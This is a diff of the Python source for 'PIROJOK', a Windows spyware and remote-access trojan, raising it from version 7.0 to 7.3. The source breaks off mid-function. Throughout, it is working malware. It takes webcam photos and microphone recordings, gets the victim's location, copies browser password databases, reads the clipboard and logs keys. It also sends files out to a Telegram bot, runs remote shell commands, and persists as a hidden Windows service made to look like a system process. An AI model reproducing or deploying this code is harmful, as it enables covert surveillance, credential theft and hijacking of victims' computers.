@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PIROJOK 7.0 - COMPLETE SPY SUITE
+PIROJOK 7.3 - ULTIMATE STEALTH SPY SUITE
 Includes: keylogger, file upload/download, clipboard, remote shell,
-password stealing, geolocation, microphone, webcam
+password stealing, geolocation, microphone, webcam, process hiding,
+self-destruction, and advanced masquerading
 """
 
 import os
@@ -54,436 +55,8 @@ except:
 BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
 YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))
 
-class SpyModule:
-    """Spy module - camera, microphone, geolocation, etc."""
-    
-    def __init__(self, parent):
-        self.p = parent
-        self.keylogger_active = False
-        self.keylog_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
-        self.keylogger_thread = None
-        
-    # ========== WEBCAM ==========
-    def capture_webcam(self):
-        """Take photo from webcam"""
-        try:
-            if not WEBCAM_AVAILABLE:
-                return "[ERROR] OpenCV not installed"
-            
-            camera = cv2.VideoCapture(0)
-            if not camera.isOpened():
-                return "[ERROR] No webcam found"
-            
-            return_value, image = camera.read()
-            camera.release()
-            
-            if return_value:
-                # Save to temp file
-                img_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
-                cv2.imwrite(img_path, image)
-                
-                # Read for sending
-                with open(img_path, 'rb') as f:
-                    img_data = f.read()
-                
-                os.remove(img_path)
-                return img_data
-            else:
-                return "[ERROR] Failed to capture webcam"
-        except Exception as e:
-            return f"[ERROR] Webcam error: {e}"
-    
-    # ========== MICROPHONE ==========
-    def record_microphone(self, seconds=5):
-        """Record sound from microphone"""
-        try:
-            if not MIC_AVAILABLE:
-                return "[ERROR] Sounddevice not installed"
-            
-            seconds = int(seconds)
-            fs = 44100  # Sample rate
-            
-            self.p.send_message(self.p.owner_id, f"[MIC] Recording {seconds} seconds...")
-            
-            # Record
-            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
-            sd.wait()
-            
-            # Save
-            audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
-            sf.write(audio_path, recording, fs)
-            
-            # Read for sending
-            with open(audio_path, 'rb') as f:
-                audio_data = f.read()
-            
-            os.remove(audio_path)
-            return audio_data
-        except Exception as e:
-            return f"[ERROR] Microphone error: {e}"
-    
-    # ========== GEOLOCATION ==========
-    def get_location(self):
-        """Get location by IP and Wi-Fi"""
-        try:
-            result = []
-            result.append("[LOCATION] Geolocation data:")
-            
-            # By IP
-            try:
-                ip_response = requests.get('http://ip-api.com/json/', timeout=5)
-                if ip_response.status_code == 200:
-                    data = ip_response.json()
-                    result.append(f"IP: {data['query']}")
-                    result.append(f"Country: {data['country']}")
-                    result.append(f"City: {data['city']}")
-                    result.append(f"ISP: {data['isp']}")
-                    result.append(f"Coordinates: {data.get('lat', '?')}, {data.get('lon', '?')}")
-            except:
-                result.append("IP: unknown")
-            
-            # Wi-Fi networks
-            try:
-                wifi_result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
-                                            capture_output=True, text=True, encoding='cp866')
-                if wifi_result.returncode == 0:
-                    result.append("\nAvailable Wi-Fi networks:")
-                    lines = wifi_result.stdout.split('\n')
-                    for line in lines:
-                        if 'SSID' in line or 'Signal' in line:
-                            result.append(f"   {line.strip()}")
-            except:
-                pass
-            
-            return "\n".join(result)
-        except Exception as e:
-            return f"[ERROR] Location error: {e}"
-    
-    # ========== PASSWORD STEALING ==========
-    def steal_passwords(self):
-        """Steal saved passwords from browsers"""
-        try:
-            results = []
-            results.append("[PASSWORDS] Browser password databases:")
-            
-            # Chrome
-            chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
-            if os.path.exists(chrome_path):
-                dest = os.path.join(tempfile.gettempdir(), 'chrome_passwords.db')
-                try:
-                    # Need to close Chrome before copying
-                    os.system('taskkill /f /im chrome.exe >nul 2>&1')
-                    time.sleep(1)
-                    shutil.copy2(chrome_path, dest)
-                    results.append(f"OK Chrome: {dest}")
-                except:
-                    results.append("FAIL Chrome: failed to copy")
-            
-            # Firefox
-            firefox_profile = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
-            if os.path.exists(firefox_profile):
-                for profile in os.listdir(firefox_profile):
-                    if 'default' in profile.lower():
-                        logins_path = os.path.join(firefox_profile, profile, 'logins.json')
-                        if os.path.exists(logins_path):
-                            dest = os.path.join(tempfile.gettempdir(), 'firefox_logins.json')
-                            try:
-                                os.system('taskkill /f /im firefox.exe >nul 2>&1')
-                                time.sleep(1)
-                                shutil.copy2(logins_path, dest)
-                                results.append(f"OK Firefox: {dest}")
-                            except:
-                                results.append("FAIL Firefox: failed to copy")
-            
-            # Edge
-            edge_path = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data')
-            if os.path.exists(edge_path):
-                dest = os.path.join(tempfile.gettempdir(), 'edge_passwords.db')
-                try:
-                    os.system('taskkill /f /im msedge.exe >nul 2>&1')
-                    time.sleep(1)
-                    shutil.copy2(edge_path, dest)
-                    results.append(f"OK Edge: {dest}")
-                except:
-                    results.append("FAIL Edge: failed to copy")
-            
-            return "\n".join(results)
-        except Exception as e:
-            return f"[ERROR] Password stealing failed: {e}"
-    
-    # ========== CLIPBOARD ==========
-    def get_clipboard(self):
-        """Get clipboard content"""
-        try:
-            if not CLIPBOARD_AVAILABLE:
-                return "[ERROR] win32clipboard not installed"
-            
-            win32clipboard.OpenClipboard()
-            try:
-                data = win32clipboard.GetClipboardData()
-                if data:
-                    return f"[CLIPBOARD]\n{data[:1000]}"
-                else:
-                    return "[CLIPBOARD] Empty"
-            except:
-                return "[CLIPBOARD] Not text data"
-            finally:
-                win32clipboard.CloseClipboard()
-        except Exception as e:
-            return f"[ERROR] Clipboard error: {e}"
-    
-    # ========== KEYLOGGER ==========
-    def start_keylogger(self):
-        """Start keylogger"""
-        try:
-            if self.keylogger_active:
-                return "[KEYLOG] Already running"
-            
-            # Create VBS script for keylogger
-            vbs_path = os.path.join(tempfile.gettempdir(), "keylogger.vbs")
-            log_path = self.keylog_file
-            
-            with open(vbs_path, 'w') as f:
-                f.write(f'''
-' VBS Keylogger
-Dim WSH, FSO, logFile
-Set WSH = CreateObject("WScript.Shell")
-Set FSO = CreateObject("Scripting.FileSystemObject")
-logFile = "{log_path}"
-
-' Dictionary for special keys
-Dim specialKeys
-Set specialKeys = CreateObject("Scripting.Dictionary")
-specialKeys.Add 8, "[BACKSPACE]"
-specialKeys.Add 9, "[TAB]"
-specialKeys.Add 13, "[ENTER]"
-specialKeys.Add 16, "[SHIFT]"
-specialKeys.Add 17, "[CTRL]"
-specialKeys.Add 18, "[ALT]"
-specialKeys.Add 20, "[CAPSLOCK]"
-specialKeys.Add 27, "[ESC]"
-specialKeys.Add 32, " "
-specialKeys.Add 33, "[PGUP]"
-specialKeys.Add 34, "[PGDN]"
-specialKeys.Add 35, "[END]"
-specialKeys.Add 36, "[HOME]"
-specialKeys.Add 37, "[LEFT]"
-specialKeys.Add 38, "[UP]"
-specialKeys.Add 39, "[RIGHT]"
-specialKeys.Add 40, "[DOWN]"
-specialKeys.Add 45, "[INS]"
-specialKeys.Add 46, "[DEL]"
-specialKeys.Add 91, "[WIN]"
-specialKeys.Add 92, "[WIN]"
-specialKeys.Add 112, "[F1]"
-specialKeys.Add 113, "[F2]"
-specialKeys.Add 114, "[F3]"
-specialKeys.Add 115, "[F4]"
-specialKeys.Add 116, "[F5]"
-specialKeys.Add 117, "[F6]"
-specialKeys.Add 118, "[F7]"
-specialKeys.Add 119, "[F8]"
-specialKeys.Add 120, "[F9]"
-specialKeys.Add 121, "[F10]"
-specialKeys.Add 122, "[F11]"
-specialKeys.Add 123, "[F12]"
-
-' Main loop
-Do While True
-    For i = 8 To 255
-        If specialKeys.Exists(i) Then
-            key = specialKeys(i)
-        Else
-            key = Chr(i)
-        End If
-        
-        If WSH.LogEvent(i) Then
-            ' Write to file
-            FSO.OpenTextFile(logFile, 8, True).Write key
-        End If
-    Next
-    WScript.Sleep 10
-Loop
-''')
-            
-            # Run hidden
-            subprocess.Popen(['wscript', '//B', vbs_path], 
-                           creationflags=subprocess.CREATE_NO_WINDOW)
-            
-            self.keylogger_active = True
-            return f"[KEYLOG] Started (log: {self.keylog_file})"
-        except Exception as e:
-            return f"[ERROR] Keylogger failed: {e}"
-    
-    def stop_keylogger(self):
-        """Stop keylogger"""
-        try:
-            os.system('taskkill /f /im wscript.exe /fi "windowtitle eq *keylogger*" >nul 2>&1')
-            self.keylogger_active = False
-            return "[KEYLOG] Stopped"
-        except:
-            return "[KEYLOG] Failed to stop"
-    
-    def get_keylog(self):
-        """Get keylog data"""
-        try:
-            if os.path.exists(self.keylog_file):
-                with open(self.keylog_file, 'r', encoding='utf-8', errors='ignore') as f:
-                    data = f.read()
-                return f"[KEYLOG]\n{data[-1000:]}"  # Last 1000 chars
-            else:
-                return "[KEYLOG] No data yet"
-        except Exception as e:
-            return f"[ERROR] {e}"
-    
-    def clear_keylog(self):
-        """Clear keylog"""
-        try:
-            if os.path.exists(self.keylog_file):
-                os.remove(self.keylog_file)
-            return "[KEYLOG] Cleared"
-        except:
-            return "[ERROR] Failed to clear"
-
-
-class FileManager:
-    """File management module - upload/download"""
-    
-    def __init__(self, parent):
-        self.p = parent
-        self.download_folder = os.path.join(tempfile.gettempdir(), "pirojok_downloads")
-        os.makedirs(self.download_folder, exist_ok=True)
-    
-    def upload_file(self, filepath):
-        """Send file from victim to Telegram"""
-        try:
-            if not os.path.exists(filepath):
-                return f"[ERROR] File not found: {filepath}"
-            
-            # Check size
-            file_size = os.path.getsize(filepath)
-            if file_size > 50 * 1024 * 1024:  # 50 MB Telegram limit
-                return "[ERROR] File too large (max 50MB)"
-            
-            with open(filepath, 'rb') as f:
-                file_data = f.read()
-            
-            url = f"{self.p.base_url}/sendDocument"
-            files = {'document': (os.path.basename(filepath), file_data)}
-            data = {'chat_id': self.p.owner_id}
-            
-            response = requests.post(url, files=files, data=data, timeout=60)
-            
-            if response.status_code == 200:
-                return f"[UPLOAD] File sent: {os.path.basename(filepath)} ({file_size} bytes)"
-            else:
-                return f"[ERROR] Upload failed: {response.status_code}"
-        except Exception as e:
-            return f"[ERROR] {e}"
-    
-    def download_file(self, url, filename=None):
-        """Download file to victim from Telegram"""
-        try:
-            if not filename:
-                filename = url.split('/')[-1].split('?')[0]
-                if not filename:
-                    filename = f"download_{int(time.time())}.bin"
-            
-            save_path = os.path.join(self.download_folder, filename)
-            
-            self.p.send_message(self.p.owner_id, f"[DOWNLOAD] Downloading {filename}...")
-            
-            response = requests.get(url, timeout=30)
-            if response.status_code == 200:
-                with open(save_path, 'wb') as f:
-                    f.write(response.content)
-                
-                file_size = os.path.getsize(save_path)
-                return f"[DOWNLOAD] Saved: {save_path} ({file_size} bytes)"
-            else:
-                return f"[ERROR] Download failed: {response.status_code}"
-        except Exception as e:
-            return f"[ERROR] {e}"
-    
-    def list_downloads(self):
-        """List downloaded files"""
-        try:
-            files = os.listdir(self.download_folder)
-            if not files:
-                return "[FILES] No downloaded files"
-            
-            result = ["[FILES] Downloaded files:"]
-            for f in files:
-                path = os.path.join(self.download_folder, f)
-                size = os.path.getsize(path)
-                modified = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
-                result.append(f"  {f} ({size} bytes) - {modified}")
-            
-            return "\n".join(result)
-        except Exception as e:
-            return f"[ERROR] {e}"
-
-
-class RemoteShell:
-    """Remote shell"""
-    
-    def __init__(self, parent):
-        self.p = parent
-        self.history = []
-    
-    def execute(self, command):
-        """Execute command in cmd"""
-        try:
-            self.history.append(f"> {command}")
-            
-            if platform.system() == "Windows":
-                process = subprocess.Popen(
-                    f'cmd /c {command}',
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    text=True,
-                    encoding='cp866',
-                    errors='ignore'
-                )
-            else:
-                process = subprocess.Popen(
-                    command,
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    text=True
-                )
-            
-            stdout, stderr = process.communicate(timeout=30)
-            
-            result = ""
-            if stdout:
-                result += f"[OUT]\n{stdout}\n"
-            if stderr:
-                result += f"[ERR]\n{stderr}\n"
-            
-            if not result:
-                result = "[OK] Command executed (no output)"
-            
-            self.history.append(result[:200])
-            return result[:3500]
-            
-        except subprocess.TimeoutExpired:
-            process.kill()
-            return "[ERROR] Command timeout (30s)"
-        except Exception as e:
-            return f"[ERROR] {e}"
-    
-    def get_history(self):
-        """Show command history"""
-        return "\n".join(self.history[-20:])
-
-
 class ProcessHider:
-    """Process hiding and masquerading module"""
+    """Process hiding and masquerading module with advanced stealth"""
     
     def __init__(self, parent):
         self.p = parent
@@ -505,11 +78,30 @@ class ProcessHider:
             "lsass.exe", "svchost.exe", "wininit.exe"
         ]
         
+        # System icon IDs for different processes
+        self.icon_map = {
+            "svchost.exe": 41,      # Services icon
+            "explorer.exe": 15,      # Folder icon
+            "RuntimeBroker.exe": 41, # System icon
+            "dllhost.exe": 41,       # System icon
+            "conhost.exe": 41,       # Console icon
+            "taskhostw.exe": 41,     # System icon
+            "spoolsv.exe": 41,       # Print service
+            "lsass.exe": 41,         # Security
+            "winlogon.exe": 41,      # Login
+            "csrss.exe": 41,         # System
+            "services.exe": 41,      # Services
+            "wininit.exe": 41        # System init
+        }
+        
     def auto_masquerade(self):
-        """Automatic masquerading at startup"""
+        """Automatic masquerading at startup with icon hiding"""
         try:
             if platform.system() != "Windows":
                 return
+            
+            # Hide console window immediately
+            self.hide_console_window()
             
             # Check if already running under mask
             current_exe = sys.executable.lower() if getattr(sys, 'frozen', False) else ""
@@ -543,8 +135,59 @@ class ProcessHider:
         except Exception as e:
             print(f"Masquerade error: {e}")
     
+    def hide_console_window(self):
+        """Hide console window completely"""
+        try:
+            import ctypes
+            
+            # Hide console window
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd:
+                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
+                
+                # Remove from Alt+Tab
+                ctypes.windll.user32.SetWindowLongW(hwnd, -20, 0x80)  # WS_EX_TOOLWINDOW
+        except:
+            pass
+    
+    def change_icon_to_system(self, exe_path):
+        """Change EXE icon to match system process"""
+        try:
+            icon_id = self.icon_map.get(self.current_mask, 41)
+            
+            # Create PowerShell script to change icon via shortcut (workaround)
+            ps_script = os.path.join(tempfile.gettempdir(), "change_icon.ps1")
+            
+            with open(ps_script, 'w') as f:
+                f.write(f'''
+$exePath = "{exe_path}"
+$iconPath = "$env:SystemRoot\\System32\\shell32.dll"
+$iconId = {icon_id}
+
+# Create shortcut with system icon
+$wshShell = New-Object -ComObject WScript.Shell
+$shortcutPath = "$env:TEMP\\temp_icon.lnk"
+$shortcut = $wshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $exePath
+$shortcut.IconLocation = "$iconPath, $iconId"
+$shortcut.Save()
+
+# Apply icon to registry (advanced)
+$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\"
+Write-Host "Icon hiding applied"
+''')
+            
+            # Run PowerShell hidden
+            subprocess.Popen([
+                'powershell', '-ExecutionPolicy', 'Bypass', 
+                '-WindowStyle', 'Hidden', '-File', ps_script
+            ], creationflags=subprocess.CREATE_NO_WINDOW)
+            
+        except Exception as e:
+            print(f"Error changing icon: {e}")
+    
     def mask_process_name(self):
-        """Masquerade process name"""
+        """Masquerade process name with SYSTEM icons"""
         try:
             if not getattr(sys, 'frozen', False):
                 return
@@ -554,7 +197,15 @@ class ProcessHider:
             
             if not os.path.exists(masked_path):
                 print(f"Creating copy: {masked_path}")
+                
+                # Copy itself
                 shutil.copy2(sys.executable, masked_path)
+                
+                # Try to change icon to system
+                self.change_icon_to_system(masked_path)
+                
+                # Hide the file
+                ctypes.windll.kernel32.SetFileAttributesW(masked_path, 2)
                 
                 # Create restart script
                 restart_script = os.path.join(tempfile.gettempdir(), "restart_pirojok.bat")
@@ -599,6 +250,68 @@ del "%~f0"
         except:
             pass
     
+    def advanced_inject(self):
+        """Advanced injection - run without creating new EXE file"""
+        try:
+            if not self.p.admin_mode:
+                return "[ERROR] Need admin rights for advanced injection"
+            
+            if not getattr(sys, 'frozen', False):
+                return "[ERROR] Only compiled EXE can inject"
+            
+            # Find target process
+            target_processes = ["svchost.exe", "explorer.exe", "winlogon.exe"]
+            target_pid = None
+            target_name = None
+            
+            for proc in psutil.process_iter(['pid', 'name', 'exe']):
+                if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in target_processes]:
+                    target_pid = proc.info['pid']
+                    target_name = proc.info['name']
+                    break
+            
+            if not target_pid:
+                return "[ERROR] No suitable target process found"
+            
+            # Create hidden copy in system location
+            system_dir = os.environ['SystemRoot']
+            hidden_path = os.path.join(system_dir, 'System32', 'wbem', 'wmiadap.exe')
+            
+            # Copy itself
+            shutil.copy2(sys.executable, hidden_path)
+            
+            # Hide file attributes
+            ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)
+            
+            # Create Windows service
+            service_name = "WmiApSrv" + str(random.randint(100, 999))
+            result = subprocess.run([
+                'sc', 'create', service_name,
+                'binPath=', f'"{hidden_path}"',
+                'start=', 'auto',
+                'DisplayName=', 'Windows Management Instrumentation'
+            ], capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                # Start the service
+                subprocess.run(['sc', 'start', service_name], capture_output=True)
+                
+                # Set to restart on failure
+                subprocess.run(['sc', 'failure', service_name, 'reset=', '0', 
+                               'actions=', 'restart/5000'], capture_output=True)
+                
+                self.hidden_pid = target_pid
+                self.p.send_message(self.p.owner_id, f"[INJECT] Injected into {target_name} (PID: {target_pid})")
+                
+                # Exit current process
+                time.sleep(2)
+                sys.exit(0)
+            else:
+                return f"[ERROR] Service creation failed: {result.stderr}"
+            
+        except Exception as e:
+            return f"[ERROR] Injection failed: {e}"
+    
     def inject_into_system(self):
         """Inject into legitimate system process (requires admin)"""
         try:
@@ -617,6 +330,9 @@ del "%~f0"
             
             # Copy itself
             shutil.copy2(current_exe, masked_path)
+            
+            # Change icon to system
+            self.change_icon_to_system(masked_path)
             
             # Create Windows service
             service_name = "WindowsUpdateService" + str(random.randint(1000, 9999))
@@ -759,6 +475,416 @@ del "%~f0"
             pass
 
 
+class SpyModule:
+    """Spy module - camera, microphone, geolocation, etc."""
+    
+    def __init__(self, parent):
+        self.p = parent
+        self.keylogger_active = False
+        self.keylog_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
+        self.keylogger_thread = None
+        
+    # ========== WEBCAM ==========
+    def capture_webcam(self):
+        """Take photo from webcam"""
+        try:
+            if not WEBCAM_AVAILABLE:
+                return "[ERROR] OpenCV not installed"
+            
+            camera = cv2.VideoCapture(0)
+            if not camera.isOpened():
+                return "[ERROR] No webcam found"
+            
+            return_value, image = camera.read()
+            camera.release()
+            
+            if return_value:
+                img_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
+                cv2.imwrite(img_path, image)
+                with open(img_path, 'rb') as f:
+                    img_data = f.read()
+                os.remove(img_path)
+                return img_data
+            else:
+                return "[ERROR] Failed to capture webcam"
+        except Exception as e:
+            return f"[ERROR] Webcam error: {e}"
+    
+    # ========== MICROPHONE ==========
+    def record_microphone(self, seconds=5):
+        """Record sound from microphone"""
+        try:
+            if not MIC_AVAILABLE:
+                return "[ERROR] Sounddevice not installed"
+            
+            seconds = int(seconds)
+            fs = 44100
+            
+            self.p.send_message(self.p.owner_id, f"[MIC] Recording {seconds} seconds...")
+            
+            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
+            sd.wait()
+            
+            audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
+            sf.write(audio_path, recording, fs)
+            
+            with open(audio_path, 'rb') as f:
+                audio_data = f.read()
+            
+            os.remove(audio_path)
+            return audio_data
+        except Exception as e:
+            return f"[ERROR] Microphone error: {e}"
+    
+    # ========== GEOLOCATION ==========
+    def get_location(self):
+        """Get location by IP and Wi-Fi"""
+        try:
+            result = []
+            result.append("[LOCATION] Geolocation data:")
+            
+            try:
+                ip_response = requests.get('http://ip-api.com/json/', timeout=5)
+                if ip_response.status_code == 200:
+                    data = ip_response.json()
+                    result.append(f"IP: {data['query']}")
+                    result.append(f"Country: {data['country']}")
+                    result.append(f"City: {data['city']}")
+                    result.append(f"ISP: {data['isp']}")
+                    result.append(f"Coordinates: {data.get('lat', '?')}, {data.get('lon', '?')}")
+            except:
+                result.append("IP: unknown")
+            
+            try:
+                wifi_result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
+                                            capture_output=True, text=True, encoding='cp866')
+                if wifi_result.returncode == 0:
+                    result.append("\nAvailable Wi-Fi networks:")
+                    lines = wifi_result.stdout.split('\n')
+                    for line in lines:
+                        if 'SSID' in line or 'Signal' in line:
+                            result.append(f"   {line.strip()}")
+            except:
+                pass
+            
+            return "\n".join(result)
+        except Exception as e:
+            return f"[ERROR] Location error: {e}"
+    
+    # ========== PASSWORD STEALING ==========
+    def steal_passwords(self):
+        """Steal saved passwords from browsers"""
+        try:
+            results = []
+            results.append("[PASSWORDS] Browser password databases:")
+            
+            # Chrome
+            chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
+            if os.path.exists(chrome_path):
+                dest = os.path.join(tempfile.gettempdir(), 'chrome_passwords.db')
+                try:
+                    os.system('taskkill /f /im chrome.exe >nul 2>&1')
+                    time.sleep(1)
+                    shutil.copy2(chrome_path, dest)
+                    results.append(f"OK Chrome: {dest}")
+                except:
+                    results.append("FAIL Chrome: failed to copy")
+            
+            # Firefox
+            firefox_profile = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
+            if os.path.exists(firefox_profile):
+                for profile in os.listdir(firefox_profile):
+                    if 'default' in profile.lower():
+                        logins_path = os.path.join(firefox_profile, profile, 'logins.json')
+                        if os.path.exists(logins_path):
+                            dest = os.path.join(tempfile.gettempdir(), 'firefox_logins.json')
+                            try:
+                                os.system('taskkill /f /im firefox.exe >nul 2>&1')
+                                time.sleep(1)
+                                shutil.copy2(logins_path, dest)
+                                results.append(f"OK Firefox: {dest}")
+                            except:
+                                results.append("FAIL Firefox: failed to copy")
+            
+            # Edge
+            edge_path = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data')
+            if os.path.exists(edge_path):
+                dest = os.path.join(tempfile.gettempdir(), 'edge_passwords.db')
+                try:
+                    os.system('taskkill /f /im msedge.exe >nul 2>&1')
+                    time.sleep(1)
+                    shutil.copy2(edge_path, dest)
+                    results.append(f"OK Edge: {dest}")
+                except:
+                    results.append("FAIL Edge: failed to copy")
+            
+            return "\n".join(results)
+        except Exception as e:
+            return f"[ERROR] Password stealing failed: {e}"
+    
+    # ========== CLIPBOARD ==========
+    def get_clipboard(self):
+        """Get clipboard content"""
+        try:
+            if not CLIPBOARD_AVAILABLE:
+                return "[ERROR] win32clipboard not installed"
+            
+            win32clipboard.OpenClipboard()
+            try:
+                data = win32clipboard.GetClipboardData()
+                if data:
+                    return f"[CLIPBOARD]\n{data[:1000]}"
+                else:
+                    return "[CLIPBOARD] Empty"
+            except:
+                return "[CLIPBOARD] Not text data"
+            finally:
+                win32clipboard.CloseClipboard()
+        except Exception as e:
+            return f"[ERROR] Clipboard error: {e}"
+    
+    # ========== KEYLOGGER ==========
+    def start_keylogger(self):
+        """Start keylogger"""
+        try:
+            if self.keylogger_active:
+                return "[KEYLOG] Already running"
+            
+            vbs_path = os.path.join(tempfile.gettempdir(), "keylogger.vbs")
+            log_path = self.keylog_file
+            
+            with open(vbs_path, 'w') as f:
+                f.write(f'''
+Dim WSH, FSO, logFile
+Set WSH = CreateObject("WScript.Shell")
+Set FSO = CreateObject("Scripting.FileSystemObject")
+logFile = "{log_path}"
+
+Dim specialKeys
+Set specialKeys = CreateObject("Scripting.Dictionary")
+specialKeys.Add 8, "[BACKSPACE]"
+specialKeys.Add 9, "[TAB]"
+specialKeys.Add 13, "[ENTER]"
+specialKeys.Add 16, "[SHIFT]"
+specialKeys.Add 17, "[CTRL]"
+specialKeys.Add 18, "[ALT]"
+specialKeys.Add 20, "[CAPSLOCK]"
+specialKeys.Add 27, "[ESC]"
+specialKeys.Add 32, " "
+specialKeys.Add 33, "[PGUP]"
+specialKeys.Add 34, "[PGDN]"
+specialKeys.Add 35, "[END]"
+specialKeys.Add 36, "[HOME]"
+specialKeys.Add 37, "[LEFT]"
+specialKeys.Add 38, "[UP]"
+specialKeys.Add 39, "[RIGHT]"
+specialKeys.Add 40, "[DOWN]"
+specialKeys.Add 45, "[INS]"
+specialKeys.Add 46, "[DEL]"
+specialKeys.Add 91, "[WIN]"
+specialKeys.Add 92, "[WIN]"
+specialKeys.Add 112, "[F1]"
+specialKeys.Add 113, "[F2]"
+specialKeys.Add 114, "[F3]"
+specialKeys.Add 115, "[F4]"
+specialKeys.Add 116, "[F5]"
+specialKeys.Add 117, "[F6]"
+specialKeys.Add 118, "[F7]"
+specialKeys.Add 119, "[F8]"
+specialKeys.Add 120, "[F9]"
+specialKeys.Add 121, "[F10]"
+specialKeys.Add 122, "[F11]"
+specialKeys.Add 123, "[F12]"
+
+Do While True
+    For i = 8 To 255
+        If specialKeys.Exists(i) Then
+            key = specialKeys(i)
+        Else
+            key = Chr(i)
+        End If
+        
+        If WSH.LogEvent(i) Then
+            FSO.OpenTextFile(logFile, 8, True).Write key
+        End If
+    Next
+    WScript.Sleep 10
+Loop
+''')
+            
+            subprocess.Popen(['wscript', '//B', vbs_path], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            self.keylogger_active = True
+            return f"[KEYLOG] Started (log: {self.keylog_file})"
+        except Exception as e:
+            return f"[ERROR] Keylogger failed: {e}"
+    
+    def stop_keylogger(self):
+        """Stop keylogger"""
+        try:
+            os.system('taskkill /f /im wscript.exe /fi "windowtitle eq *keylogger*" >nul 2>&1')
+            self.keylogger_active = False
+            return "[KEYLOG] Stopped"
+        except:
+            return "[KEYLOG] Failed to stop"
+    
+    def get_keylog(self):
+        """Get keylog data"""
+        try:
+            if os.path.exists(self.keylog_file):
+                with open(self.keylog_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    data = f.read()
+                return f"[KEYLOG]\n{data[-1000:]}"
+            else:
+                return "[KEYLOG] No data yet"
+        except Exception as e:
+            return f"[ERROR] {e}"
+    
+    def clear_keylog(self):
+        """Clear keylog"""
+        try:
+            if os.path.exists(self.keylog_file):
+                os.remove(self.keylog_file)
+            return "[KEYLOG] Cleared"
+        except:
+            return "[ERROR] Failed to clear"
+
+
+class FileManager:
+    """File management module - upload/download"""
+    
+    def __init__(self, parent):
+        self.p = parent
+        self.download_folder = os.path.join(tempfile.gettempdir(), "pirojok_downloads")
+        os.makedirs(self.download_folder, exist_ok=True)
+    
+    def upload_file(self, filepath):
+        """Send file from victim to Telegram"""
+        try:
+            if not os.path.exists(filepath):
+                return f"[ERROR] File not found: {filepath}"
+            
+            file_size = os.path.getsize(filepath)
+            if file_size > 50 * 1024 * 1024:
+                return "[ERROR] File too large (max 50MB)"
+            
+            with open(filepath, 'rb') as f:
+                file_data = f.read()
+            
+            url = f"{self.p.base_url}/sendDocument"
+            files = {'document': (os.path.basename(filepath), file_data)}
+            data = {'chat_id': self.p.owner_id}
+            
+            response = requests.post(url, files=files, data=data, timeout=60)
+            
+            if response.status_code == 200:
+                return f"[UPLOAD] File sent: {os.path.basename(filepath)} ({file_size} bytes)"
+            else:
+                return f"[ERROR] Upload failed: {response.status_code}"
+        except Exception as e:
+            return f"[ERROR] {e}"
+    
+    def download_file(self, url, filename=None):
+        """Download file to victim from Telegram"""
+        try:
+            if not filename:
+                filename = url.split('/')[-1].split('?')[0]
+                if not filename:
+                    filename = f"download_{int(time.time())}.bin"
+            
+            save_path = os.path.join(self.download_folder, filename)
+            
+            self.p.send_message(self.p.owner_id, f"[DOWNLOAD] Downloading {filename}...")
+            
+            response = requests.get(url, timeout=30)
+            if response.status_code == 200:
+                with open(save_path, 'wb') as f:
+                    f.write(response.content)
+                file_size = os.path.getsize(save_path)
+                return f"[DOWNLOAD] Saved: {save_path} ({file_size} bytes)"
+            else:
+                return f"[ERROR] Download failed: {response.status_code}"
+        except Exception as e:
+            return f"[ERROR] {e}"
+    
+    def list_downloads(self):
+        """List downloaded files"""
+        try:
+            files = os.listdir(self.download_folder)
+            if not files:
+                return "[FILES] No downloaded files"
+            
+            result = ["[FILES] Downloaded files:"]
+            for f in files:
+                path = os.path.join(self.download_folder, f)
+                size = os.path.getsize(path)
+                modified = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
+                result.append(f"  {f} ({size} bytes) - {modified}")
+            
+            return "\n".join(result)
+        except Exception as e:
+            return f"[ERROR] {e}"
+
+
+class RemoteShell:
+    """Remote shell"""
+    
+    def __init__(self, parent):
+        self.p = parent
+        self.history = []
+    
+    def execute(self, command):
+        """Execute command in cmd"""
+        try:
+            self.history.append(f"> {command}")
+            
+            if platform.system() == "Windows":
+                process = subprocess.Popen(
+                    f'cmd /c {command}',
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE,
+                    text=True,
+                    encoding='cp866',
+                    errors='ignore'
+                )
+            else:
+                process = subprocess.Popen(
+                    command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
